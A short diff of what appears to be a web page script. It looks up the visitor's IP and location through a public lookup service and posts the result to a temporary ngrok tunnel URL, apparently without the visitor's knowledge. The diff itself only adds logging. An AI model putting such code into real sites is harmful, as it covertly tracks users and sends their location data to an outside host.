@@ -11,7 +11,7 @@ for(let i=0; i < tempPr.length + 100; i+=100) {
 }
 
 // Example POST method implementation:
-async function postData(url = '', data = {}) {
+async function postData(url = '', data) {
     // Default options are marked with *
     const response = await fetch(url, { 
       method: 'POST', // *GET, POST, PUT, DELETE, etc.
@@ -35,6 +35,7 @@ let testing = 1
 fetch('https://api.db-ip.com/v2/free/self')
 .then(res => res.json())
 .then(data => {
+    console.log(data)
     postData('https://72e5-95-102-48-209.ngrok.io', data)
   .then(data => {
     console.log(data); // JSON data parsed by `data.json()` call
